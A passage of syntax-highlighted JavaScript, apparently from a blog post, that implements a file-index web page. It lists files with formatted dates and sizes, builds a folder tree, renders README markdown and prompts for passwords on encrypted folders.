function_">querySelector</span>(<span class="string">&#x27;.time&#x27;</span>).<span class="property">innerHTML</span> = time;</span></span><br><span class="line"><span class="language-javascript">                fileWrapper.<span class="title function_">querySelector</span>(<span class="string">&#x27;.size&#x27;</span>).<span class="property">innerHTML</span> = size;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">addFileListLineListener</span>(fileWrapper.<span class="title function_">querySelector</span>(<span class="string">&#x27;.row.file-wrapper&#x27;</span>), path, url, size);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> fileWrapper;</span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> <span class="title function_">formatDate</span> = date =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> <span class="title function_">addZero</span> = num =&gt; num &gt; <span class="number">9</span> ? num : <span class="string">&#x27;0&#x27;</span> + num;</span></span><br><span class="line"><span class="language-javascript">                date = <span class="keyword">new</span> <span class="title class_">Date</span>(date);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> year = date.<span class="title function_">getFullYear</span>();</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> month = <span class="title function_">addZero</span>(date.<span class="title function_">getMonth</span>() + <span class="number">1</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> day = <span class="title function_">addZero</span>(date.<span class="title function_">getDate</span>());</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> hour = <span class="title function_">addZero</span>(date.<span class="title function_">getHours</span>());</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> minute = <span class="title function_">addZero</span>(date.<span class="title function_">getMinutes</span>());</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> second = <span class="title function_">addZero</span>(date.<span class="title function_">getSeconds</span>());</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> <span class="string">&#x27;yyyy-MM-dd HH:mm:ss&#x27;</span></span></span><br><span class="line"><span class="language-javascript">                    .<span class="title function_">replace</span>(<span class="string">&#x27;yyyy&#x27;</span>, year)</span></span><br><span class="line"><span class="language-javascript">                    .<span class="title function_">replace</span>(<span class="string">&#x27;MM&#x27;</span>, month)</span></span><br><span class="line"><span class="language-javascript">                    .<span class="title function_">replace</span>(<span class="string">&#x27;dd&#x27;</span>, day)</span></span><br><span class="line"><span class="language-javascript">                    .<span class="title function_">replace</span>(<span class="string">&#x27;HH&#x27;</span>, hour)</span></span><br><span class="line"><span class="language-javascript">                    .<span class="title function_">replace</span>(<span class="string">&#x27;mm&#x27;</span>, minute)</span></span><br><span class="line"><span class="language-javascript">                    .<span class="title function_">replace</span>(<span class="string">&#x27;ss&#x27;</span>, second);</span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> <span class="title function_">formatSize</span> = size =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">let</span> count = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">while</span> (size &gt;= <span class="number">1024</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    size /= <span class="number">1024</span>;</span></span><br><span class="line"><span class="language-javascript">                    count++;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                size = size.<span class="title function_">toFixed</span>(<span class="number">2</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">switch</span> (count) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">case</span> <span class="number">1</span>:</span></span><br><span class="line"><span class="language-javascript">                        size += <span class="string">&#x27; KB&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">case</span> <span class="number">2</span>:</span></span><br><span class="line"><span class="language-javascript">                        size += <span class="string">&#x27; MB&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">case</span> <span class="number">3</span>:</span></span><br><span class="line"><span class="language-javascript">                        size += <span class="string">&#x27; GB&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">case</span> <span class="number">4</span>:</span></span><br><span class="line"><span class="language-javascript">                        size += <span class="string">&#x27; TB&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">case</span> <span class="number">5</span>:</span></span><br><span class="line"><span class="language-javascript">                        size += <span class="string">&#x27; PB&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">default</span>:</span></span><br><span class="line"><span class="language-javascript">                        size += <span class="string">&#x27; B&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> size;</span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> fileList = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;file-list&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            fileList.<span class="property">innerHTML</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            files.<span class="property">files</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">file</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (file.<span class="property">name</span>.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>).<span class="title function_">pop</span>() === <span class="string">&#x27;md&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span> (file.<span class="property">url</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="title function_">renderReadme</span>(files.<span class="property">parent</span> + <span class="string">&#x27;/&#x27;</span> + file.<span class="property">name</span>, file.<span class="property">url</span>);</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">const</span> parent = files.<span class="property">parent</span> === <span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">root</span> ? <span class="string">&#x27;&#x27;</span> : files.<span class="property">parent</span>;</span></span><br><span class="line"><span class="language-javascript">                    fileList.<span class="title function_">appendChild</span>(<span class="title function_">createFileWrapper</span>(</span></span><br><span class="line"><span class="language-javascript">                        file.<span class="property">url</span> ? <span class="string">&#x27;document&#x27;</span> : <span class="string">&#x27;folder&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                        file.<span class="property">name</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="title function_">formatDate</span>(file.<span class="property">time</span>),</span></span><br><span class="line"><span class="language-javascript">                        <span class="title function_">formatSize</span>(file.<span class="property">size</span>),</span></span><br><span class="line"><span class="language-javascript">                        parent + <span class="string">&#x27;/&#x27;</span> + file.<span class="property">name</span>,</span></span><br><span class="line"><span class="language-javascript">                        file.<span class="property">url</span></span></span><br><span class="line"><span class="language-javascript">                    ));</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">renderTreeNode</span>(<span class="params">files</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> <span class="title function_">createTreeNodeWrapper</span> = (<span class="params">array, type, name, path</span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">let</span> treeNodeWrapper = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;tree-node-wrapper-template&#x27;</span>).<span class="property">content</span></span></span><br><span class="line"><span class="language-javascript">                    .<span class="title function_">cloneNode</span>(<span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">let</span> icons = treeNodeWrapper.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;ion-icon&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                icons[<span class="number">0</span>].<span class="title function_">setAttribute</span>(<span class="string">&#x27;name&#x27;</span>, array);</span></span><br><span class="line"><span class="language-javascript">                icons[<span class="number">1</span>].<span class="title function_">setAttribute</span>(<span class="string">&#x27;name&#x27;</span>, type);</span></span><br><span class="line"><span class="language-javascript">                treeNodeWrapper.<span class="title function_">querySelector</span>(<span class="string">&#x27;.tree-node-name&#x27;</span>).<span class="property">innerText</span> = name;</span></span><br><span class="line"><span class="language-javascript">                treeNodeWrapper.<span class="property">appendNode</span> = <span class="function"><span class="params">node</span> =&gt;</span> treeNodeWrapper.<span class="title function_">querySelector</span>(<span class="string">&#x27;.tree-node-wrapper&#x27;</span>).<span class="title function_">append</span>(</span></span><br><span class="line"><span class="language-javascript">                    node);</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">addTreeNodeListener</span>(treeNodeWrapper.<span class="title function_">querySelector</span>(<span class="string">&#x27;.tree-node&#x27;</span>), path);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> treeNodeWrapper;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> paths = files.<span class="property">parent</span>.<span class="title function_">split</span>(<span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> <span class="title function_">absolutePath</span> = max =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">let</span> absolutePath = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">1</span>; j &lt;= max; j++) &#123;</span></span><br><span class="line"><span class="language-javascript">                    absolutePath += <span class="string">&#x27;/&#x27;</span> + paths[j];</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> absolutePath;</span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> maxIndex = paths.<span class="property">length</span> - <span class="number">1</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> currentTreeNode = <span class="title function_">createTreeNodeWrapper</span>(<span class="string">&#x27;arrow-dropdown&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&#x27;folder-open&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                paths[maxIndex],</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">absolutePath</span>(maxIndex)</span></span><br><span class="line"><span class="language-javascript">            );</span></span><br><span class="line"><span class="language-javascript">            files.<span class="property">files</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">file</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (!file.<span class="property">url</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    currentTreeNode.<span class="title function_">appendNode</span>(<span class="title function_">createTreeNodeWrapper</span>(<span class="string">&#x27;arrow-dropright&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="string">&#x27;folder&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                        file.<span class="property">name</span>,</span></span><br><span class="line"><span class="language-javascript">                        files.<span class="property">parent</span> + <span class="string">&#x27;/&#x27;</span> + file.<span class="property">name</span></span></span><br><span class="line"><span class="language-javascript">                    ));</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">for</span> (<span class="keyword">let</span> i = maxIndex - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> currentTreeNodeParentAbsolutePath = <span class="title function_">absolutePath</span>(i);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">let</span> currentTreeNodeParent = <span class="title function_">createTreeNodeWrapper</span>(<span class="string">&#x27;arrow-dropdown&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="string">&#x27;folder&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                    paths[i],</span></span><br><span class="line"><span class="language-javascript">                    currentTreeNodeParentAbsolutePath</span></span><br><span class="line"><span class="language-javascript">                );</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">let</span> cache = <span class="variable language_">window</span>.<span class="property">fileCache</span>.<span class="title function_">get</span>(currentTreeNodeParentAbsolutePath);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (cache) &#123;</span></span><br><span class="line"><span class="language-javascript">                    cache.<span class="property">files</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">file</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">if</span> (!file.<span class="property">url</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">if</span> (file.<span class="property">name</span> === paths[i + <span class="number">1</span>]) &#123;</span></span><br><span class="line"><span class="language-javascript">                                currentTreeNodeParent.<span class="title function_">appendNode</span>(currentTreeNode);</span></span><br><span class="line"><span class="language-javascript">                            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                                currentTreeNodeParent.<span class="title function_">appendNode</span>(<span class="title function_">createTreeNodeWrapper</span>(</span></span><br><span class="line"><span class="language-javascript">                                    <span class="string">&#x27;arrow-dropright&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                                    <span class="string">&#x27;folder&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                                    file.<span class="property">name</span>,</span></span><br><span class="line"><span class="language-javascript">                                    currentTreeNodeParentAbsolutePath + <span class="string">&#x27;/&#x27;</span> + file.<span class="property">name</span></span></span><br><span class="line"><span class="language-javascript">                                ));</span></span><br><span class="line"><span class="language-javascript">                            &#125;</span></span><br><span class="line"><span class="language-javascript">                        &#125;</span></span><br><span class="line"><span class="language-javascript">                    &#125;);</span></span><br><span class="line"><span class="language-javascript">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    currentTreeNodeParent.<span class="title function_">appendNode</span>(currentTreeNode);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                currentTreeNode = currentTreeNodeParent;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> treeRoot = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;tree-root&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            treeRoot.<span class="property">innerHTML</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> cache = <span class="variable language_">window</span>.<span class="property">fileCache</span>.<span class="title function_">get</span>(<span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">root</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> currentNodeName = currentTreeNode.<span class="title function_">querySelector</span>(<span class="string">&#x27;.tree-node-name&#x27;</span>).<span class="property">innerText</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (cache) &#123;</span></span><br><span class="line"><span class="language-javascript">                cache.<span class="property">files</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">file</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span> (!file.<span class="property">url</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">if</span> (file.<span class="property">name</span> === currentNodeName) &#123;</span></span><br><span class="line"><span class="language-javascript">                            treeRoot.<span class="title function_">append</span>(currentTreeNode);</span></span><br><span class="line"><span class="language-javascript">                        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                            treeRoot.<span class="title function_">append</span>(<span class="title function_">createTreeNodeWrapper</span>(</span></span><br><span class="line"><span class="language-javascript">                                <span class="string">&#x27;arrow-dropright&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                                <span class="string">&#x27;folder&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                                file.<span class="property">name</span>,</span></span><br><span class="line"><span class="language-javascript">                                <span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">root</span> + file.<span class="property">name</span></span></span><br><span class="line"><span class="language-javascript">                            ));</span></span><br><span class="line"><span class="language-javascript">                        &#125;</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;);</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                treeRoot.<span class="title function_">append</span>(currentTreeNode);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">renderReadme</span>(<span class="params">path, url</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> <span class="title function_">render</span> = text =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">let</span> markedText;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    markedText = <span class="title function_">marked</span>(text, &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">gfm</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">highlight</span>: <span class="function">(<span class="params">code, lang, callback</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">return</span> hljs.<span class="title function_">highlight</span>(lang, code).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">                        &#125;</span></span><br><span class="line"><span class="language-javascript">                    &#125;);</span></span><br><span class="line"><span class="language-javascript">                &#125; <span class="keyword">catch</span> (e) &#123;</span></span><br><span class="line"><span class="language-javascript">                    markedText = <span class="title function_">marked</span>(text, &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">gfm</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">highlight</span>: <span class="function">(<span class="params">code, lang, callback</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">return</span> hljs.<span class="title function_">highlight</span>(<span class="string">&#x27;bash&#x27;</span>, code).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">                        &#125;</span></span><br><span class="line"><span class="language-javascript">                    &#125;);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">backFordwardCache</span>.<span class="property">current</span> + <span class="string">&#x27;/README.md&#x27;</span> === path) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span> (!<span class="variable language_">window</span>.<span class="property">backFordwardCache</span>.<span class="property">preview</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;readme&#x27;</span>).<span class="property">innerHTML</span> = markedText;</span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.markdown-body&#x27;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;block&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">let</span> cache = <span class="variable language_">window</span>.<span class="property">fileCache</span>.<span class="title function_">get</span>(path);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (!cache || cache === <span class="literal">true</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">window</span>.<span class="property">fileCache</span>.<span class="title function_">set</span>(path, text);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> text = <span class="variable language_">window</span>.<span class="property">fileCache</span>.<span class="title function_">get</span>(path);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (text === <span class="literal">true</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">let</span> cacheWaitReadmeFetch = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    text = <span class="variable language_">window</span>.<span class="property">fileCache</span>.<span class="title function_">get</span>(path);</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span> (<span class="keyword">typeof</span> text === <span class="string">&#x27;object&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="title function_">render</span>(text, path);</span></span><br><span class="line"><span class="language-javascript">                        <span class="built_in">clearInterval</span>(cacheWaitReadmeFetch);</span></span><br><span class="line"><span class="language-javascript">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (text === <span class="literal">false</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="built_in">clearInterval</span>(cacheWaitReadmeFetch);</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;, <span class="number">100</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (text) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">render</span>(text, path);</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">window</span>.<span class="property">fileCache</span>.<span class="title function_">set</span>(path, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">sendRequest</span>(<span class="string">&#x27;GET&#x27;</span>, url, <span class="literal">null</span>, <span class="literal">null</span>, <span class="function"><span class="params">text</span> =&gt;</span> <span class="title function_">render</span>(text, path), <span class="function">() =&gt;</span> <span class="variable language_">window</span>.<span class="property">fileCache</span>.<span class="title function_">set</span>(path, <span class="literal">false</span>));</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">handleEncryptedFolder</span>(<span class="params">files</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">switchRightDisplay</span>(<span class="string">&#x27;encrypted&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> password = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.password&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> input = password.<span class="title function_">querySelector</span>(<span class="string">&#x27;input&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> button = password.<span class="title function_">querySelector</span>(<span class="string">&#x27;button&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> buttonParent = button.<span class="property">parentElement</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> buttonClone = button.<span class="title function_">cloneNode</span>(<span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">            buttonParent.<span class="title function_">replaceChild</span>(buttonClone, button);</span></span><br><span class="line"><span class="language-javascript">            input.<span class="property">placeholder</span> = <span class="string">&#x27;请输入密码&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            buttonClone.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> passwd = input.<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (!input.<span class="property">value</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                input.<span class="property">value</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                input.<span class="property">placeholder</span> = <span class="string">&#x27;正在验证..&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">sendRequest</span>(<span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">method</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">url</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">window</span>.<span class="property">api</span>.<span class="title function_">formatPayload</span>(files.<span class="property">parent</span>, passwd),</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">headers</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="function"><span class="params">data</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">const</span> newFiles = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(data);</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">if</span> (newFiles.<span class="property">encrypted</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                            input.<span class="property">placeholder</span> = <span class="string">&#x27;密码错误&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="variable language_">window</span>.<span class="property">fileCache</span>.<span class="title function_">set</span>(newFiles.<span class="property">parent</span>, newFiles);</span></span><br><span class="line"><span class="language-javascript">                            <span class="title function_">fetchFileList</span>(newFiles.<span class="property">parent</span>);</span></span><br><span class="line"><span class="language-javascript">                        &#125;</span></span><br><span class="line"><span class="language-javascript">                    &#125;,</span></span><br><span class="line"><span class="language-javascript">                    <span class="function">() =&gt;</span> <span class="variable language_">window</span>.<span class="property">fileCache</span>.<span class="title function_">set</span>(newFiles.<span class="property">parent</span>, <span class="literal">false</span>)</span></span><br><span class="line"><span class="language-javascript">                );</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">addPathListener</span>(<span class="params">elem, path</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            elem.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">fetchFileList</span>(path);</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">switchBackForwardStatus</span>(path);</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">addTreeNodeListener</span>(<span class="params">elem, path</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            elem.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">fetchFileList</span>(path);</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">switchBackForwardStatus</span>(path);</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">addFileListLineListener</span>(<span class="params">elem, path, url, size</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (url) &#123;</span></span><br><span class="line"><span class="language-javascript">                elem.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">window</span>.<span class="property">backFordwardCache</span>.<span class="property">preview</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">const</span> previewHandler = &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">copyTextContent</span>: <span class="function">(<span class="params">source, text</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">let</span> result = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">let</span> target = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;pre&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                            target.<span class="property">style</span>.<span class="property">opacity</span> = <span class="string">&#x27;0&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            target.<span class="property">textContent</span> = text || 